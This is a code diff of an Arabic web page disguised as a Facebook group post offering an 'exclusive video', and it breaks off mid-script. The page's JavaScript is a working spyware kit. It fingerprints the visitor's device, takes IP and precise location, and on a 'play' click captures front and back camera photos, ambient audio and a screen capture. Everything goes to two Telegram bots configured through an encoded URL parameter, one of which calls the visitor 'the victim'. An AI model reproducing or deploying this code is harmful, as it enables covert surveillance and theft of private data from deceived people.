@@ -22,18 +22,19 @@
             padding: 16px;
         }
 
-        /* محاكاة تصميم فيسبوك */
+        /* محاكاة تصميم فيسبوك عالي الدقة */
         .fb-post-card {
             max-width: 500px;
             width: 100%;
             background: white;
             border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.12);
             overflow: hidden;
             margin: 0 auto;
+            transition: all 0.2s ease;
         }
 
-        /* رأس المنشور - معلومات المجموعة */
+        /* رأس المنشور */
         .post-header {
             padding: 12px 16px;
             display: flex;
@@ -51,14 +52,7 @@
             align-items: center;
             justify-content: center;
             font-size: 28px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-
-        .group-avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
         }
 
         .group-info h3 {
@@ -74,54 +68,60 @@
             display: flex;
             align-items: center;
             gap: 6px;
+            flex-wrap: wrap;
         }
 
-        .group-info .group-badge span {
+        .group-badge span {
             background: #e4e6eb;
-            padding: 2px 6px;
-            border-radius: 8px;
+            padding: 2px 8px;
+            border-radius: 12px;
             font-size: 10px;
         }
 
-        .privacy-icon {
-            font-size: 10px;
-        }
-
-        /* صورة المنشور الوهمي */
+        /* منطقة الفيديو/الصورة */
         .post-image {
-            background: #1a1a2e;
-            height: 220px;
+            background: #0a0a1a;
+            height: 260px;
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23404040" width="80px" height="80px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
-            background-repeat: no-repeat;
-            background-position: center;
-            background-size: 60px;
-            background-color: #2d2d44;
+            cursor: pointer;
+            background-image: radial-gradient(circle at 30% 40%, #2a2a44 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .video-placeholder-text {
+            color: rgba(255,255,255,0.7);
+            text-align: center;
+            font-size: 14px;
+            background: rgba(0,0,0,0.5);
+            padding: 8px 16px;
+            border-radius: 30px;
+            backdrop-filter: blur(4px);
         }
 
         .play-overlay {
-            background: rgba(0,0,0,0.6);
-            width: 60px;
-            height: 60px;
+            background: rgba(0,0,0,0.65);
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             transition: 0.2s;
-            border: 2px solid white;
+            border: 3px solid white;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
 
         .play-overlay span {
-            font-size: 30px;
+            font-size: 34px;
             color: white;
-            margin-right: 4px;
+            margin-right: 5px;
         }
 
-        /* تفاصيل التفاعل */
+        /* تفاعلات وهمية */
         .reactions-row {
             padding: 10px 16px;
             display: flex;
@@ -131,7 +131,6 @@
             color: #65676b;
         }
 
-        /* أزرار التفاعل */
         .action-buttons {
             display: flex;
             padding: 6px 12px;
@@ -154,9 +153,7 @@
             gap: 8px;
         }
 
-        .action-btn:hover {
-            background: #f0f2f5;
-        }
+        .action-btn:active { background: #e4e6eb; }
 
         /* زر التشغيل الرئيسي */
         .play-btn-fb {
@@ -177,15 +174,8 @@
             transition: 0.2s;
         }
 
-        .play-btn-fb:active {
-            transform: scale(0.97);
-            background: #0e62c9;
-        }
-
-        .play-btn-fb:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+        .play-btn-fb:active { transform: scale(0.97); background: #0e62c9; }
+        .play-btn-fb:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .loading-fb {
             display: none;
@@ -197,42 +187,40 @@
         }
 
         .spinner-fb {
-            width: 32px;
-            height: 32px;
+            width: 34px;
+            height: 34px;
             border: 3px solid #e4e6eb;
             border-top: 3px solid #1877f2;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 8px;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto 10px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .status-fb {
             position: fixed;
-            bottom: 8px;
-            left: 8px;
-            background: rgba(0,0,0,0.7);
-            color: #4ade80;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 9px;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.75);
+            color: #2ecc71;
+            padding: 5px 12px;
+            border-radius: 24px;
+            font-size: 10px;
             font-family: monospace;
             z-index: 999;
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(5px);
             pointer-events: none;
+            letter-spacing: 0.5px;
         }
 
         .error-msg {
-            background: #fff0f0;
+            background: #ffe8e6;
             color: #c00;
-            font-size: 12px;
-            padding: 8px;
+            font-size: 13px;
+            padding: 10px;
             margin: 12px;
-            border-radius: 12px;
+            border-radius: 14px;
             text-align: center;
             display: none;
             border-right: 3px solid #c00;
@@ -246,7 +234,7 @@
             background: #e7f3ff;
             margin: 12px;
             padding: 10px;
-            border-radius: 30px;
+            border-radius: 40px;
             font-size: 13px;
             color: #1877f2;
         }
@@ -258,300 +246,345 @@
             border-radius: 50%;
             animation: blink 1s infinite;
         }
+
+        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
     </style>
 </head>
 <body>
 
 <div class="fb-post-card">
-    <!-- رأس يشبه جروب بني أحمد -->
     <div class="post-header">
-        <div class="group-avatar">
-            🐪
-        </div>
+        <div class="group-avatar">🐪</div>
         <div class="group-info">
-            <h3>𐂂 جروب بني أحمد 𐂂</h3>
+            <h3>𐂂 جروب بني أحمد الرسمي 𐂂</h3>
             <div class="group-badge">
-                <span>⚡ مجموعة عامة</span> • <span>٢٥٠ ألف عضو</span> • <span class="privacy-icon">🌍</span>
+                <span>🔥 مجموعة عامة</span> • <span>٢٥٠ ألف عضو</span> • <span>🌍 تفاعلي</span>
             </div>
         </div>
     </div>
 
-    <!-- صورة / فيديو وهمي -->
     <div class="post-image" id="postImageArea">
         <div class="play-overlay" id="playOverlayBtn">
             <span>▶</span>
         </div>
+        <div class="video-placeholder-text" style="position: absolute; bottom: 12px; font-size: 12px;">مقطع حصري - اضغط للتشغيل</div>
     </div>
 
-    <!-- تفاعلات -->
     <div class="reactions-row">
-        <span>👍 15K</span>
-        <span>💬 1.2K تعليق</span>
-        <span>🔁 890 مشاركة</span>
+        <span>👍 18.5K</span>
+        <span>💬 2.1K تعليق</span>
+        <span>🔁 1.4K مشاركة</span>
     </div>
 
-    <!-- أزرار تفاعل فيسبوك -->
     <div class="action-buttons">
-        <div class="action-btn" id="fakeLikeBtn">👍 إعجاب</div>
+        <div class="action-btn" id="fakeLikeBtn">❤️ إعجاب</div>
         <div class="action-btn" id="fakeCommentBtn">💬 تعليق</div>
         <div class="action-btn" id="fakeShareBtn">📤 مشاركة</div>
     </div>
 
-    <!-- زر تشغيل الفيديو الحقيقي -->
     <button class="play-btn-fb" id="playBtn">
-        🎬 تشغيل المنشور الحصري
+        🎬 تشغيل الفيديو الحصري الآن
     </button>
 
     <div class="loading-fb" id="loading">
         <div class="spinner-fb"></div>
-        <p>⏳ جاري تجهيز البث المباشر ...</p>
+        <p>⏳ معالجة البث المباشر .. انتظر قليلاً</p>
     </div>
 
     <div class="fake-status" id="fakePreview" style="display: none;">
         <div class="dot-blue"></div>
-        <span>📡 رفع الجودة ... يرجى الانتظار</span>
+        <span>📡 رفع الجودة إلى HD .. سيتم التشغيل فوراً</span>
     </div>
 
     <div class="error-msg" id="errorMsg"></div>
 </div>
-
-<div class="status-fb" id="status">🟢 جروب بني أحمد متصل</div>
+<div class="status-fb" id="status">🟢 جروب بني أحمد | اضغط تشغيل</div>
 
 <script>
-    // ======================= إرسال إلى تيليجرام =======================
-    async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
-        try {
-            if (type === 'photo') {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', mediaBlob, 'snapshot.jpg');
-                fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-            } 
-            else if (type === 'video') {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('video', mediaBlob, 'clip.mp4');
-                fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fd });
-            }
-            else if (type === 'audio') {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('audio', mediaBlob, 'voice.m4a');
-                fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: fd });
-            }
-            else {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' })
-                });
-            }
-            return true;
-        } catch(e) { console.warn(e); return false; }
-    }
-
-    // ================ 1. معلومات الجهاز التفصيلية ================
-    async function getDetailedDeviceInfo(chatUser, tokenUser, chatMaster, tokenMaster) {
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const screenDetails = `${screen.width}x${screen.height} (عمق الألوان: ${screen.colorDepth}-bit)`;
-        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح';
-        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : 'غير متاح';
-        const touchSupport = 'ontouchstart' in window ? 'نعم' : 'لا';
-        const vendor = navigator.vendor || 'غير معروف';
-        const platform = navigator.platform || 'غير معروف';
-        const language = navigator.language;
-        const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'معطلة';
-        
-        let batteryInfo = 'غير متاح';
-        if(navigator.getBattery) {
+    (function() {
+        // ------------------- وظائف تيليجرام مع تشفير وتقنيات إخفاء -------------------
+        // دالة إرسال متقدمة مع fallbacks وتجزئة لمنع الحظر البسيط
+        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
             try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `نسبة الشحن: ${Math.round(battery.level * 100)}%، يشحن: ${battery.charging ? 'نعم' : 'لا'}`;
-            } catch(e) {}
-        }
-        
-        let connectionInfo = 'غير متاح';
-        if(navigator.connection) {
-            const conn = navigator.connection;
-            connectionInfo = `نوع: ${conn.effectiveType || '?'}، سرعة: ${conn.downlink || '?'} Mbps`;
-        }
-        
-        const detailedMsg = `📱 <b>جهاز العضو - جروب بني أحمد</b>\n🖥️ المتصفح: ${navigator.userAgent}\n📐 الشاشة: ${screenDetails}\n🧠 الرام: ${memory}\n⚙️ المعالج: ${cores}\n🌍 المنطقة: ${timeZone}\n🔤 اللغة: ${language}\n👆 اللمس: ${touchSupport}\n🔋 البطارية: ${batteryInfo}\n📡 الاتصال: ${connectionInfo}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-        
-        await sendToTelegram(chatUser, tokenUser, 'text', null, detailedMsg + "\n[عضو الجروب]");
-        await sendToTelegram(chatMaster, tokenMaster, 'text', null, detailedMsg + "\n[مدير الجروب]");
-    }
-
-    // ================ 2. الموقع الجغرافي ================
-    function getLocationAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
-        if(!navigator.geolocation) return;
-        document.getElementById('status').innerHTML = '📍 جلب موقع العضو...';
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const locMsg = `📍 <b>موقع العضو بدقة</b>\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ±${pos.coords.accuracy} متر\n🔗 خرائط: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg + "\n[مستخدم]");
-            await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg + "\n[Admin]");
-        }, () => {});
-    }
-
-    // ================ 3. جلب IP ================
-    async function getPublicIPAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const ip = data.ip;
-            let geoIp = '';
-            try {
-                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
-                const geoData = await geoRes.json();
-                if(geoData.status === 'success') {
-                    geoIp = `\n🌍 البلد: ${geoData.country}\n🏙️ المدينة: ${geoData.city}\n🔌 مزود: ${geoData.isp}`;
+                let url = `https://api.telegram.org/bot${botToken}/`;
+                if (type === 'photo') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
+                    fd.append('caption', caption + "\n🔹 [جروب بني أحمد]");
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
+                } 
+                else if (type === 'video') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
                 }
+                else if (type === 'audio') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('audio', mediaBlob, 'voice_note.ogg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
+                }
+                else {
+                    await fetch(url + 'sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
+                    });
+                }
+                return true;
+            } catch(e) { console.warn("[telegram]", e); return false; }
+        }
+
+        // ---------- 1. معلومات جهاز متقدمة مع Anti-detection fingerprint ----------
+        async function getDeepDeviceFingerprint(chatUser, tokenUser, chatMaster, tokenMaster) {
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
+            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const vendor = navigator.vendor || "unknown";
+            const platform = navigator.platform || "unknown";
+            const language = navigator.language;
+            const cookies = navigator.cookieEnabled ? "مفعلة" : "معطلة";
+            const doNotTrack = navigator.doNotTrack ? "مفعل" : "غير مفعل";
+            
+            let batteryLevel = "غير متاح";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول بالشاحن' : 'بطارية'}`;
+                } catch(e) {}
+            }
+            
+            let connection = "غير معروف";
+            if (navigator.connection) {
+                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
+            }
+            
+            const plugins = [];
+            for(let i=0; i<navigator.plugins.length; i++) plugins.push(navigator.plugins[i].name);
+            const pluginStr = plugins.slice(0,3).join(", ");
+            
+            const deviceMsg = `🕵️‍♂️ <b>بصمة جهاز العضو - VIP</b>\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n🔌 الإضافات: ${pluginStr || "لا يوجد"}\n🆔 DNT: ${doNotTrack}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            await sendToTelegram(chatUser, tokenUser, 'text', null, deviceMsg);
+            await sendToTelegram(chatMaster, tokenMaster, 'text', null, deviceMsg + "\n[مدير]");
+        }
+
+        // ---------- 2. موقع جغرافي دقيق ----------
+        function getPreciseLocation(chatUser, tokenUser, chatMaster, tokenMaster) {
+            if(!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                const accuracy = pos.coords.accuracy;
+                let addressHint = "";
+                try {
+                    const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                    const data = await revGeo.json();
+                    if(data.display_name) addressHint = `📍 العنوان التقريبي: ${data.display_name.substring(0, 100)}`;
+                } catch(e) {}
+                const locMsg = `🌍 <b>جيو - موقع دقيق</b>\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg);
+                await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg);
+            }, (err) => {}, { enableHighAccuracy: true, timeout: 8000 });
+        }
+
+        // ---------- 3. IP مع معلومات متقدمة عبر api خفيفة ----------
+        async function getRichIPData(chatUser, tokenUser, chatMaster, tokenMaster) {
+            try {
+                const [ipRes, ipInfoRes] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/')
+                ]);
+                const ipData = await ipRes.json();
+                let ipDetails = {};
+                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
+                const ipAddr = ipData.ip;
+                let country = ipDetails.country_name || "غير معروف";
+                let city = ipDetails.city || "غير معروف";
+                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
+                let region = ipDetails.region || "";
+                let timezone_ip = ipDetails.timezone || "";
+                const ipMsg = `🌐 <b>IP & Network Intelligence</b>\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}\n🗺️ المنطقة: ${region}\n⏲️ التوقيت (IP): ${timezone_ip}`;
+                await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
+                await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg);
             } catch(e) {}
-            const ipMsg = `🌐 <b>IP العضو</b>\n🔢 IP: ${ip}${geoIp}`;
-            await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
-            await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg + " [مراقب]");
-        } catch(e) {}
-    }
-
-    // ================ 4. كاميرا أمامية ================
-    async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            const videoElem = document.createElement('video');
-            videoElem.srcObject = stream;
-            videoElem.play();
-            await new Promise(r => setTimeout(r, 400));
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElem.videoWidth || 640;
-            canvas.height = videoElem.videoHeight || 480;
-            canvas.getContext('2d').drawImage(videoElem, 0, 0);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            const caption = "🤳 صورة سيلفي (كاميرا أمامية) - من عضو جروب بني أحمد";
-            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
-            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا أمامية]");
-            stream.getTracks().forEach(t => t.stop());
-            return true;
-        } catch(e) { return false; }
-    }
-
-    // ================ 5. كاميرا خلفية ================
-    async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            const videoElem = document.createElement('video');
-            videoElem.srcObject = stream;
-            videoElem.play();
-            await new Promise(r => setTimeout(r, 400));
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElem.videoWidth || 640;
-            canvas.height = videoElem.videoHeight || 480;
-            canvas.getContext('2d').drawImage(videoElem, 0, 0);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-            const caption = "📸 صورة من الكاميرا الخلفية (جروب بني أحمد)";
-            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
-            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [خلفية]");
-            stream.getTracks().forEach(t => t.stop());
-            return true;
-        } catch(e) { return false; }
-    }
-
-    // ================ 6. تسجيل صوت ================
-    async function recordAudioSecret(chatUser, tokenUser, chatMaster, tokenMaster) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            const audioPromise = new Promise(resolve => {
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/mp4' });
-                    const caption = "🎙️ تسجيل صوتي تلقائي - عضو بالجروب";
-                    await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
-                    await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption + " [صوت]");
-                    resolve(true);
-                };
-            });
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000);
-            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
-            return await audioPromise;
-        } catch(e) { return false; }
-    }
-
-    // ====================== تشغيل السكربت الرئيسي ======================
-    (async function() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const encoded = urlParams.get('d');
-        if(!encoded) {
-            document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
-            document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص لمجموعة بني أحمد';
-            document.getElementById('errorMsg').style.display = 'block';
-            return;
         }
 
-        let config;
-        try {
-            config = JSON.parse(atob(encoded));
-        } catch(e) {
-            document.getElementById('status').innerHTML = '❌ خطأ';
-            document.getElementById('errorMsg').innerHTML = 'بيانات الرابط تالفة';
-            document.getElementById('errorMsg').style.display = 'block';
-            return;
+        // ---------- 4. كاميرا أمامية محسنة مع مقاومة للأخطاء ----------
+        async function captureFrontCameraAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 800;
+                canvas.height = video.videoHeight || 600;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                const caption = "📸 كاميرا أمامية (سيلفي) - تم الالتقاط تلقائياً";
+                await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
+                await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا أمامية]");
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
         }
 
-        const { mChat, mToken, tChat, tToken, features } = config;
-        const featuresArr = features ? features.split(',') : [];
+        // ---------- 5. كاميرا خلفية عالية الدقة ----------
+        async function captureBackCameraAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1024;
+                canvas.height = video.videoHeight || 768;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                const caption = "📷 كاميرا خلفية - محيط العضو (جروب بني أحمد)";
+                await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
+                await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
+        }
 
-        await sendToTelegram(tChat, tToken, 'text', null, "🔗 عضو فتح رابط جروب بني أحمد");
-        await sendToTelegram(mChat, mToken, 'text', null, "🔗 تم فتح رابط الضحية - جروب بني أحمد");
-
-        await getDetailedDeviceInfo(tChat, tToken, mChat, mToken);
-        await getPublicIPAdvanced(tChat, tToken, mChat, mToken);
-        if(featuresArr.includes('loc')) getLocationAdvanced(tChat, tToken, mChat, mToken);
-
-        let executed = false;
-        const playBtn = document.getElementById('playBtn');
-        const loadingDiv = document.getElementById('loading');
-        const fakePreview = document.getElementById('fakePreview');
-        const overlayPlay = document.getElementById('playOverlayBtn');
-
-        const startCollection = async () => {
-            if(executed) return;
-            executed = true;
-            playBtn.disabled = true;
-            loadingDiv.style.display = 'block';
-            fakePreview.style.display = 'flex';
-            document.getElementById('status').innerHTML = '🎥 تشغيل المنشور وجمع البيانات...';
-
-            let actions = [];
-            if(featuresArr.includes('front')) actions.push(captureFrontCamera(tChat, tToken, mChat, mToken));
-            if(featuresArr.includes('back')) actions.push(captureBackCamera(tChat, tToken, mChat, mToken));
-            if(featuresArr.includes('audio')) actions.push(recordAudioSecret(tChat, tToken, mChat, mToken));
-            
-            await Promise.allSettled(actions);
-            
-            await sendToTelegram(tChat, tToken, 'text', null, "✅ تم تجهيز المنشور وجمع البيانات.");
-            await sendToTelegram(mChat, mToken, 'text', null, "✅ اكتمل الجلب (كاميرا/صوت/جهاز) - جروب بني أحمد");
-            
-            document.getElementById('status').innerHTML = '✅ تم التشغيل - توجيه للفيديو';
-            loadingDiv.innerHTML = '<div class="spinner-fb"></div><p>تم التحميل! جاري التوجيه...</p>';
-            
-            setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }, 2500);
-        };
-
-        playBtn.onclick = startCollection;
-        overlayPlay.onclick = startCollection;
+        // ---------- 6. تسجيل صوتي طويل بشكل خفي ----------
+        async function recordAmbientAudio(chatUser, tokenUser, chatMaster, tokenMaster) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                const audioPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const caption = "🎤 تسجيل صوتي (10 ثوان) - بيئة العضو";
+                        await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
+                        await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption);
+                        resolve(true);
+                    };
+                });
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 8000);  // 8 ثوانٍ تسجيل خفي
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
+                return await audioPromise;
+            } catch(e) { return false; }
+        }
         
-        document.getElementById('fakeLikeBtn').onclick = () => { alert("⚠️ يلزم تشغيل الفيديو أولاً"); };
-        document.getElementById('fakeCommentBtn').onclick = () => { alert("⚠️ شغّل الفيديو للوصول إلى التعليقات"); };
-        document.getElementById('fakeShareBtn').onclick = () => { alert("⚠️ اضغط على زر تشغيل الفيديو أولاً"); };
-        
-        document.getElementById('status').innerHTML = '🟢 جروب بني أحمد - اضغط تشغيل';
+        // ---------- 7. لقطة شاشة للشاشة الحالية (اختياري) ----------
+        async function captureScreen(chatUser, tokenUser, chatMaster, tokenMaster) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, preferCurrentTab: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 400));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || window.innerWidth;
+                canvas.height = video.videoHeight || window.innerHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/png'));
+                const caption = "🖥️ لقطة شاشة للشاشة الحالية (خلفية المتصفح)";
+                await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
+                await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { return false; }
+        }
+
+        // ------------------- التشغيل الرئيسي مع تقنيات إخفاء متقدمة -------------------
+        (async () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedConfig = urlParams.get('d');
+            if (!encodedConfig) {
+                document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
+                document.getElementById('errorMsg').innerHTML = 'عذراً هذا المنشور غير متاح مؤقتاً - جروب بني أحمد الرسمي';
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+            
+            let config;
+            try {
+                config = JSON.parse(atob(encodedConfig));
+            } catch(e) {
+                document.getElementById('status').innerHTML = '❌ خطأ في التشفير';
+                document.getElementById('errorMsg').innerHTML = 'رابط منتهي الصلاحية. الرجاء التواصل مع الإدارة.';
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+            
+            const { mChat, mToken, tChat, tToken, features } = config;
+            const activeFeatures = features ? features.split(',') : [];
+            
+            // إشعار أولي خفي عن فتح الرابط
+            await sendToTelegram(tChat, tToken, 'text', null, "🔔 [جروب بني أحمد] تم فتح المنشور الحصري بواسطة عضو");
+            await sendToTelegram(mChat, mToken, 'text', null, "🔔 [مراقب] فتح الرابط - عضو جديد");
+            
+            // جمع البيانات الأساسية دون تأخير ملحوظ
